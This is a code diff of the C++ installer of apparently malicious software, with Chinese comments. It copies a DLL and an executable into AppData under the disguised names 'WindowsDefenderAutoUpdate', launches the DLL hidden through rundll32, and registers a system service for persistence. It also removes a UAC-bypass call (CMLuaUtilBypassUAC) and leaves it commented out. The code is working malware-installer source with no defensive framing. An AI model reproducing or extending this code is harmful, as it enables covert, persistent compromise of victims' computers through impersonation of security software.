@@ -3,11 +3,11 @@
 
 #include <iostream>
 #include <windows.h> 
+#include <atlconv.h>
 #include <shlobj.h>
 #include <shlwapi.h>
 #pragma comment(lib,"Shlwapi.lib")
 
-#include "BypassUAC.h"
 #include "SystemService.h"
 
 
@@ -43,16 +43,9 @@ int main()
 			CloseHandle(hFile);
 		}
 
-		// 本程序所在路径
-		WCHAR pszThisProgramPath[MAX_PATH];
-		GetModuleFileName(NULL, pszThisProgramPath, MAX_PATH);
+		WCHAR pszInstallFilePath[MAX_PATH];
+		GetModuleFileName(NULL, pszInstallFilePath, MAX_PATH);
 
-		// 提权后再次运行此程序
-		CMLuaUtilBypassUAC(pszThisProgramPath);
-	}
-
-	// 非第一次，已提权
-	else {
 
 		// 程序所在目录
 		WCHAR pszFileDir[MAX_PATH];
@@ -71,7 +64,7 @@ int main()
 		wcscat_s(pszSystemServiceExePath, L"\\SystemService.exe");
 
 		// MuaClient.dll和SystemService.exe不在当前目录则退出安装程序
-		if (!(PathFileExists(pszMuaClientDllPath) && PathFileExists(pszSystemServiceExePath))){
+		if (!(PathFileExists(pszMuaClientDllPath) && PathFileExists(pszSystemServiceExePath))) {
 			return -1;
 		}
 
@@ -89,7 +82,7 @@ int main()
 		}
 
 		// C:\Users\iyzyi\AppData\Roaming\Windows Defender\WindowsDefenderAutoUpdate.dll
-		wcscat_s(pszNewMuaClientDllPath, L"\\WindowsDefenderAutoUpdate.dll");	
+		wcscat_s(pszNewMuaClientDllPath, L"\\WindowsDefenderAutoUpdate.dll");
 		// C:\Users\iyzyi\AppData\Roaming\Windows Defender\WindowsDefenderAutoUpdate.exe
 		wcscat_s(pszNewSystemServiceExePath, L"\\WindowsDefenderAutoUpdate.exe");
 
@@ -97,6 +90,26 @@ int main()
 		CopyFile(pszMuaClientDllPath, pszNewMuaClientDllPath, FALSE);
 		CopyFile(pszSystemServiceExePath, pszNewSystemServiceExePath, FALSE);
 
+		//// 本程序所在路径
+		//WCHAR pszThisProgramPath[MAX_PATH];
+		//GetModuleFileName(NULL, pszThisProgramPath, MAX_PATH);
+
+		// 提权后再次运行此程序
+		//CMLuaUtilBypassUAC(pszThisProgramPath);
+		CHAR szCmdLine[MAX_PATH] = { 0 };
+		CHAR szRundll32Path[MAX_PATH] = "C:\\Windows\\System32\\rundll32.exe";
+		//CHAR szDllPath[MAX_PATH] = "MuaClient.dll";
+		USES_CONVERSION;
+		sprintf_s(szCmdLine, "%s \"%s\" %s %s", szRundll32Path, W2A(pszNewMuaClientDllPath), "_WindowsUpdate@16", W2A(pszInstallFilePath));
+		WinExec(szCmdLine, SW_HIDE);
+	}
+
+	// 非第一次，已提权
+	else {
+
+		WCHAR pszNewSystemServiceExePath[MAX_PATH];
+		SHGetSpecialFolderPath(NULL, pszNewSystemServiceExePath, CSIDL_APPDATA, FALSE);
+		wcscat_s(pszNewSystemServiceExePath, L"\\Windows Defender\\WindowsDefenderAutoUpdate.exe");
 
 		// 注册系统服务
 		RegisterSystemService(pszNewSystemServiceExePath);
